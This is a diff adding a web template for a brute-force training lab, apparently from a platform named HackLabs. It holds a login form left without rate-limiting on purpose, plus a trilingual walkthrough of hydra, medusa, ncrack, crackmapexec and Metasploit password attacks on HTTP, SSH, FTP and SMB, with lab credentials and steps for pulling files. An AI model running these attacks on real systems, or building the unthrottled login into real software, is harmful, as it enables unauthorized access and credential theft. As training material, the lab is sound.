@@ -1,0 +1,422 @@
+{% extends "base.html" %}
+{% block title %}H02 – Login Bruteforce – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <!-- Tab navigation -->
+  <div class="flex items-center gap-2 mb-6 flex-wrap">
+    <button class="tab-pill active" onclick="switchTab('http', this)">
+      <i class="ph ph-globe text-sm"></i> <span data-i18n="bf_tab_http">Login HTTP</span>
+    </button>
+    <button class="tab-pill" onclick="switchTab('ssh', this)">
+      <i class="ph ph-terminal-window text-sm"></i> SSH
+    </button>
+    <button class="tab-pill" onclick="switchTab('smb', this)">
+      <i class="ph ph-network text-sm"></i> SMB
+    </button>
+    <button class="tab-pill" onclick="switchTab('ftp', this)">
+      <i class="ph ph-arrow-up-right text-sm"></i> FTP
+    </button>
+  </div>
+
+  <!-- ── HTTP Login Tab ── -->
+  <div id="tab-http" class="tab-pane active">
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-4" style="color:var(--hl-primary)" data-i18n="bf_login_title">Login sin rate-limiting</div>
+
+      {% with messages = get_flashed_messages(with_categories=true) %}
+        {% for cat, msg in messages %}
+          <div class="mb-4 {% if cat == 'success' %}alert-success{% else %}alert-error{% endif %}">{{ msg }}</div>
+        {% endfor %}
+      {% endwith %}
+
+      {% if bf_result %}
+        <div class="mb-4 {% if bf_success %}alert-success{% else %}alert-error{% endif %}">{{ bf_result }}</div>
+        {% if bf_flag %}
+        <div class="mt-2 px-4 py-3 rounded font-mono text-sm" style="background:var(--hl-success-bg,#052e16);border:1px solid #16a34a;color:#4ade80;">🚩 Flag: <strong>{{ bf_flag }}</strong></div>
+        {% endif %}
+      {% endif %}
+
+      <form method="POST" action="/bruteforce/login" class="space-y-3">
+        <div>
+          <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1" data-i18n="lbl_username">Usuario</label>
+          <input type="text" name="username" placeholder="admin" class="hl-input" autocomplete="off" />
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1" data-i18n="lbl_password">Contraseña</label>
+          <input type="password" name="password" placeholder="••••••••" class="hl-input" />
+        </div>
+        <button type="submit" class="btn-primary w-full justify-center" data-i18n="btn_login">Iniciar sesión</button>
+      </form>
+    </div>
+
+  </div>
+
+  <!-- ── SSH Tab ── -->
+  <div id="tab-ssh" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">SSH Bruteforce</div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4" data-i18n="bf_ssh_desc">
+        Servicio SSH real corriendo en el puerto 22 del host objetivo. No hay rate-limiting activo.
+      </p>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># Nmap — detección de servicio</div>
+        <div>nmap -sV -p 22 TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Hydra</div>
+        <div>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP</div>
+        <div>hydra -L users.txt -P rockyou.txt -t 4 ssh://TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Medusa</div>
+        <div>medusa -h TARGET_IP -u root -P rockyou.txt -M ssh</div>
+        <div class="mt-2 text-gray-400"># ncrack</div>
+        <div>ncrack -p 22 --user root -P rockyou.txt TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Metasploit</div>
+        <div>use auxiliary/scanner/ssh/ssh_login</div>
+        <div>set RHOSTS TARGET_IP; set PASS_FILE rockyou.txt; run</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── SMB Tab ── -->
+  <div id="tab-smb" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">SMB Bruteforce</div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4" data-i18n="bf_smb_desc">
+        Servicio SMB real corriendo en el puerto 445 del host objetivo. Detectable con nmap y bruteforceable con las herramientas habituales.
+      </p>
+      <div class="hl-code text-xs space-y-1">
+        <div class="text-gray-400"># Nmap — detección de servicio</div>
+        <div>nmap -sV -p 445 TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Hydra</div>
+        <div>hydra -l Administrator -P rockyou.txt smb://TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># CrackMapExec</div>
+        <div>crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</div>
+        <div>crackmapexec smb TARGET_IP -u users.txt -p passwords.txt --no-bruteforce</div>
+        <div class="mt-2 text-gray-400"># Metasploit</div>
+        <div>use auxiliary/scanner/smb/smb_login</div>
+        <div>set RHOSTS TARGET_IP</div>
+        <div>set SMBUser Administrator</div>
+        <div>set PASS_FILE /usr/share/wordlists/rockyou.txt</div>
+        <div>run</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── FTP Tab ── -->
+  <div id="tab-ftp" class="tab-pane">
+    <div class="hl-card mb-4">
+      <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">FTP Bruteforce</div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4" data-i18n="bf_ftp_desc">
+        Servicio FTP real corriendo en el puerto 21 del host objetivo. Sin rate-limiting ni bloqueo de cuenta. El usuario y la contraseña son desconocidos — descúbrelos por fuerza bruta.
+      </p>
+      <div class="hl-code text-xs space-y-1 mb-3">
+        <div class="text-gray-400"># Servicio FTP activo en:</div>
+        <div>ftp://TARGET_IP:21</div>
+        <div class="text-gray-400 mt-2"># Nmap — detección de servicio</div>
+        <div>nmap -sV -p 21,22,445 TARGET_IP</div>
+      </div>
+      <div class="flex items-center gap-2 p-3 rounded-lg text-xs" style="background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.2)">
+        <i class="ph ph-warning text-yellow-400 text-sm"></i>
+        <span class="text-yellow-300">El usuario <strong>no está revelado</strong>. Usa una wordlist de usuarios para descubrirlo junto con la contraseña.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+{% if not bf_result %}
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Guía de uso</h3>
+    <ol>
+      <li>Reemplaza <code>TARGET_IP</code> por la IP del laboratorio (visible en el banner al arrancar con <code>deploy.sh</code>).</li>
+      <li>El endpoint HTTP no implementa rate-limiting ni bloqueo de cuenta — perfecto para bruteforce.</li>
+      <li>SSH, FTP y SMB son servicios reales del contenedor con los mismos usuarios y contraseñas.</li>
+      <li>Wordlists recomendadas: <code>/usr/share/wordlists/fasttrack.txt</code>, <code>rockyou.txt</code>, <code>SecLists/Usernames/</code></li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+
+    <h3>🌐 HTTP (puerto 80)</h3>
+    <h4>Bruteforce — Hydra</h4>
+    <pre><code class="language-bash"># Con deploy.sh / Docker (puerto 80):
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
+  TARGET_IP http-post-form \
+  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64</code></pre>
+    <h4>Bruteforce — Burp Suite Intruder</h4>
+    <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
+# Payloads: Simple list → fasttrack.txt → Launch → ordenar por longitud de respuesta</code></pre>
+    <h4>Acceso y Flag</h4>
+    <pre><code class="language-bash"># Accede al login en el navegador: http://TARGET_IP/bruteforce
+# La flag aparece automáticamente en el navegador al hacer login correcto
+🚩 HL{···}</code></pre>
+
+    <h3>🔒 SSH (puerto 22)</h3>
+    <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash"># Usuarios del lab: admin, alice, bob, charlie, dave
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ssh
+ncrack -p 22 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
+    <h4>Bruteforce — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+set RHOSTS TARGET_IP
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Acceso y Flag</h4>
+    <pre><code class="language-bash">ssh admin@TARGET_IP          # password: password1
+cat user.txt
+🚩 HL{···}</code></pre>
+
+    <h3>📁 FTP (puerto 21)</h3>
+    <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash"># Usuario conocido:
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
+
+# Usuario desconocido — Cluster Bomb:
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
+
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ftp
+ncrack -p 21 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
+    <h4>Bruteforce — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
+set RHOSTS TARGET_IP
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Acceso y Flag</h4>
+    <pre><code class="language-bash">ftp TARGET_IP                # user: admin / password: password1
+ftp> get ftp_flag.txt
+ftp> bye
+cat ftp_flag.txt
+🚩 HL{···}</code></pre>
+
+    <h3>🖧 SMB (puerto 445)</h3>
+    <h4>Bruteforce — Hydra / CrackMapExec</h4>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/fasttrack.txt smb://TARGET_IP
+crackmapexec smb TARGET_IP -u admin -p /usr/share/wordlists/fasttrack.txt</code></pre>
+    <h4>Bruteforce — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
+set RHOSTS TARGET_IP
+set SMBUser admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Enumeración de shares</h4>
+    <pre><code class="language-bash">smbmap -H TARGET_IP -u admin -p 'password1'
+smbclient -L //TARGET_IP -U admin%password1</code></pre>
+    <h4>Acceso y Flags</h4>
+    <pre><code class="language-bash"># Share: hacklabs (accesible por todos los usuarios)
+smbclient //TARGET_IP/hacklabs -U admin%password1
+smb: \> get flag.txt
+🚩 HL{···}
+
+# Share: admin_backup (solo admin)
+smbclient //TARGET_IP/admin_backup -U admin%password1
+smb: \> get root.txt
+smb: \> get passwords.txt
+🚩 HL{···}</code></pre>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Usage Guide</h3>
+    <ol>
+      <li>Replace <code>TARGET_IP</code> with the lab IP shown in the banner when starting with <code>deploy.sh</code>.</li>
+      <li>The HTTP endpoint has no rate-limiting or account lockout — ideal for bruteforce.</li>
+      <li>SSH, FTP and SMB are real container services sharing the same users and passwords.</li>
+      <li>Recommended wordlists: <code>/usr/share/wordlists/fasttrack.txt</code>, <code>rockyou.txt</code>, <code>SecLists/Usernames/</code></li>
+    </ol>
+    <h3>Tools</h3>
+    <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+
+    <h3>🌐 HTTP (port 80)</h3>
+    <h4>Bruteforce — Hydra</h4>
+    <pre><code class="language-bash"># With deploy.sh / Docker (port 80):
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
+  TARGET_IP http-post-form \
+  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64</code></pre>
+    <h4>Bruteforce — Burp Suite Intruder</h4>
+    <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
+# Payloads: Simple list → fasttrack.txt → Launch → sort by response length</code></pre>
+    <h4>Access &amp; Flag</h4>
+    <pre><code class="language-bash"># Open the login in your browser: http://TARGET_IP/bruteforce
+# The flag appears automatically in the browser after a successful login
+🚩 HL{···}</code></pre>
+
+    <h3>🔒 SSH (port 22)</h3>
+    <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash"># Lab users: admin, alice, bob, charlie, dave
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ssh
+ncrack -p 22 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
+    <h4>Bruteforce — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+set RHOSTS TARGET_IP
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Access &amp; Flag</h4>
+    <pre><code class="language-bash">ssh admin@TARGET_IP          # password: password1
+cat user.txt
+🚩 HL{···}</code></pre>
+
+    <h3>📁 FTP (port 21)</h3>
+    <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash"># Known user:
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
+
+# Unknown user — Cluster Bomb:
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
+
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ftp
+ncrack -p 21 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
+    <h4>Bruteforce — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
+set RHOSTS TARGET_IP
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Access &amp; Flag</h4>
+    <pre><code class="language-bash">ftp TARGET_IP                # user: admin / password: password1
+ftp> get ftp_flag.txt
+ftp> bye
+cat ftp_flag.txt
+🚩 HL{···}</code></pre>
+
+    <h3>🖧 SMB (port 445)</h3>
+    <h4>Bruteforce — Hydra / CrackMapExec</h4>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/fasttrack.txt smb://TARGET_IP
+crackmapexec smb TARGET_IP -u admin -p /usr/share/wordlists/fasttrack.txt</code></pre>
+    <h4>Bruteforce — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
+set RHOSTS TARGET_IP
+set SMBUser admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Share enumeration</h4>
+    <pre><code class="language-bash">smbmap -H TARGET_IP -u admin -p 'password1'
+smbclient -L //TARGET_IP -U admin%password1</code></pre>
+    <h4>Access &amp; Flags</h4>
+    <pre><code class="language-bash"># Share: hacklabs (all users)
+smbclient //TARGET_IP/hacklabs -U admin%password1
+smb: \> get flag.txt
+🚩 HL{···}
+
+# Share: admin_backup (admin only)
+smbclient //TARGET_IP/admin_backup -U admin%password1
+smb: \> get root.txt
+smb: \> get passwords.txt
+🚩 HL{···}</code></pre>
+  </div>
+
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Guia de Uso</h3>
+    <ol>
+      <li>Substitua <code>TARGET_IP</code> pelo IP do laboratório (visível no banner ao iniciar com <code>deploy.sh</code>).</li>
+      <li>O endpoint HTTP não implementa rate-limiting nem bloqueio de conta — ideal para força bruta.</li>
+      <li>SSH, FTP e SMB são serviços reais do container compartilhando os mesmos usuários e senhas.</li>
+      <li>Wordlists recomendadas: <code>/usr/share/wordlists/fasttrack.txt</code>, <code>rockyou.txt</code>, <code>SecLists/Usernames/</code></li>
+    </ol>
+    <h3>Ferramentas</h3>
+    <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">smbmap</span> <span class="tools-badge">smbclient</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+
+    <h3>🌐 HTTP (porta 80)</h3>
+    <h4>Força bruta — Hydra</h4>
+    <pre><code class="language-bash"># Com deploy.sh / Docker (porta 80):
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
+  TARGET_IP http-post-form \
+  "/bruteforce/login:username=^USER^&password=^PASS^:S=Login correcto" -t 64</code></pre>
+    <h4>Força bruta — Burp Suite Intruder</h4>
+    <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → marque §password§
+# Payloads: Simple list → fasttrack.txt → Launch → sort by response length</code></pre>
+    <h4>Acesso e Flag</h4>
+    <pre><code class="language-bash"># Acesse o login no navegador: http://TARGET_IP/bruteforce
+# A flag aparece automaticamente no navegador após o login bem-sucedido
+🚩 HL{···}</code></pre>
+
+    <h3>🔒 SSH (porta 22)</h3>
+    <h4>Força bruta — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash"># Lab users: admin, alice, bob, charlie, dave
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ssh://TARGET_IP -t 4
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ssh
+ncrack -p 22 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
+    <h4>Força bruta — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+set RHOSTS TARGET_IP
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Acesso e Flag</h4>
+    <pre><code class="language-bash">ssh admin@TARGET_IP          # password: password1
+cat user.txt
+🚩 HL{···}</code></pre>
+
+    <h3>📁 FTP (porta 21)</h3>
+    <h4>Força bruta — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash"># Known user:
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
+
+# Unknown user — Cluster Bomb:
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/fasttrack.txt ftp://TARGET_IP -t 16
+
+medusa -h TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt -M ftp
+ncrack -p 21 --user admin -P /usr/share/wordlists/fasttrack.txt TARGET_IP</code></pre>
+    <h4>Força bruta — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
+set RHOSTS TARGET_IP
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Acesso e Flag</h4>
+    <pre><code class="language-bash">ftp TARGET_IP                # user: admin / password: password1
+ftp> get ftp_flag.txt
+ftp> bye
+cat ftp_flag.txt
+🚩 HL{···}</code></pre>
+
+    <h3>🖧 SMB (porta 445)</h3>
+    <h4>Força bruta — Hydra / CrackMapExec</h4>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/fasttrack.txt smb://TARGET_IP
+crackmapexec smb TARGET_IP -u admin -p /usr/share/wordlists/fasttrack.txt</code></pre>
+    <h4>Força bruta — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
+set RHOSTS TARGET_IP
+set SMBUser admin
+set PASS_FILE /usr/share/wordlists/fasttrack.txt
+run</code></pre>
+    <h4>Enumeração de compartilhamentos</h4>
+    <pre><code class="language-bash">smbmap -H TARGET_IP -u admin -p 'password1'
+smbclient -L //TARGET_IP -U admin%password1</code></pre>
+    <h4>Acesso e Flags</h4>
+    <pre><code class="language-bash"># Share: hacklabs (all users)
+smbclient //TARGET_IP/hacklabs -U admin%password1
+smb: \> get flag.txt
+🚩 HL{···}
+
+# Share: admin_backup (admin only)
+smbclient //TARGET_IP/admin_backup -U admin%password1
+smb: \> get root.txt
+smb: \> get passwords.txt
+🚩 HL{···}</code></pre>
+  </div>
+</div>
+{% endif %}
+{% endblock %}
+
+{% block scripts %}
+<script>
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-pill').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  btn.classList.add('active');
+}
+</script>
+{% endblock %}
